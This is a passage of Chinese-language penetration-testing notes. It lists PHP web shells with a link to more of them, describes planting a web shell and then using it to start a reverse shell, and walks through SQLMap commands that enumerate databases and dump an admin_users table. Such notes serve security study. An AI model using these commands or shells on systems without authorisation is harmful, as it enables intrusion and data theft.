| **p0wny-shell** | **极简主义**。单文件 PHP 脚本，提供一个类似终端的交互式网页界面。 |
| **b374k shell** | **功能全面**。除了执行命令，还具备强大的**文件管理**（上传/下载/编辑）、流程管理等功能。 |
| **c99 shell** | **知名度极高**。功能极其丰富且强大，是渗透测试中非常经典的 Web Shell。 |

> **扩展资源**：可以在 [r57shell.net](https://www.r57shell.net/) 找到更多不同类型的 Web Shell。

---

### 💡 建议
在实战中，攻击者通常先通过漏洞植入一个简单的 **Web Shell**，然后再利用这个 Web Shell 执行一段 **Reverse Shell Payload**（如之前的 Python 或 Bash 代码），从而获得一个更稳定的交互式会话。

# SQL map
**SQLMap** 是一款用于自动化检测和利用 Web 应用程序中 **SQL 注入漏洞**的强大工具。它极大地简化了识别这类漏洞的过程。该工具已内置 Kali Linux中。

由于这是一款**命令行工具**，你必须打开 Linux 终端才能使用它。通过在 SQLMap 后面加上 **`--help`** 命令，可以列出所有可用的标志（Flags）。

如果你不想为每个命令手动添加标志，可以使用 SQLMap 的 **`--wizard`**（向导）标志。它会像安装软件一样问你“目标 URL 是什么？”、“你想探测什么级别的漏洞？”，你只需要输入数字选择即可。

**`--dbs`** 标志可以帮助你提取所有的数据库名称。一旦知道了数据库名称，你就可以使用 **`-D 数据库名 --tables`** 来提取该数据库中的表信息。在获取到表名后，如果你想枚举这些表中的记录，可以使用 **`-D 数据库名 -T 表名 --dump`**。SQLMap 工具中的这些不同标志能让你从数据库中提取非常详细的信息。现在，让我们进入实际场景，利用上述所有标志来攻击一个存在 SQL 注入漏洞的 Web 应用程序。



1.  **探测数据库**：
    `sqlmap -u "http://目标URL/search?cat=1" --dbs`
2.  **查看某个库里的表**（假设库名是 `users_db`）：
    `sqlmap -u "http://目标URL/search?cat=1" -D users_db --tables`
3.  **拖取某个表的内容**（假设表名是 `admin_users`）：
    `sqlmap -u "http://目标URL/search?cat=1" -D users_db -T admin_users --dump`
4.  **带登录状态扫描**：
    `sqlmap -u "http://目标URL/admin/profile" --cookie="PHPSESSID=你的值"`
